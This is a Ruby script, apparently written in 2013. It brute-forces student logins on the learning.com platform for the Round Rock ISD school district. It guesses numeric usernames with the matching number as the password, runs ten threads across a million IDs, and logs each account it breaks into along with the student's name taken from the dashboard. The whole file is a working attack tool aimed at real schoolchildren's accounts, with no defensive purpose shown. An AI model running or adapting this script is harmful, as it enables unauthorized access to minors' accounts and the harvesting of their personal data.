#!/usr/bin/env ruby
# learning.com numerical ID brute force script by L8D
# Written sometime during 2013
#
# This script numerically bruteforces learning.com's login page with:
#   Username: {46,07}<number here>
#   Password: <number here>
#   District: Round Rock ISD
# by default, once it successfully logs in with an "ID", it appends that ID to the logfile, by default is "scriptlog.txt"
#
# Usage: ./[scriptname].rb <start>
#
# Also, I recommend running this with jruby for better thread concurrency
require 'mechanize'
require 'colorize'

## Config

# Log file
LOG_FILE  = "scriptlog.txt"

# Prefix number for usernames...Every school has one, and usually uses them to login to the e-libraries
# The default is for a school in RRISD
LOGIN_SEQ = ["46"]

# School district
LOGIN_DIS = "Round Rock ISD"

## Program

def do_req num, seq, dis
  a = Mechanize.new
  r = {}
  a.get 'http://platform.learning.com/LoginNew.htm' do |page|
    # Submit the login form
    page.form_with do |f|
      f.learningUserName = seq + num.to_s
      f.learningPassword = num.to_s
      f.learningDistrictName = dis
    end.click_button

    after_page = page.forms.first.submit
    r[:success] = !(after_page.content.include? 'Error')
  end

  return r unless r[:success]
  xml_address = 'http://platform.learning.com/Services/Ajax/Student/Student.asmx/GetAllDashboardInfo'
  xml = a.post xml_address, xml_address
  r[:name] = xml.at('Name').children[0].content
  r
end

# Arg parser
if ARGV.length == 0
  puts "No args"
  exit
end


# Mutlithread
threads = []

class InsNum
  attr_reader :value
  def initialize number
    @value = number - 1
  end

  def get_value
    @value += 1
    @value
  end
end

open LOG_FILE, "a" do |log_file|
  current_id = InsNum.new ARGV[0].to_i

  10.times do
    threads << Thread.new do
      while current_id.value < 999999 do
        x = current_id.get_value
        puts "?".blue + " #{x}"
        LOGIN_SEQ.each do |seq|
          r = do_req x, seq, LOGIN_DIS
          if r[:success]
            log_file.puts "#{seq} #{x} #{r[:name]}"
            puts "!".red + " #{x} #{seq} #{r[:name]}"
          end
        end
      end
    end
  end

  threads.each do |thread|
    thread.join
  end
end
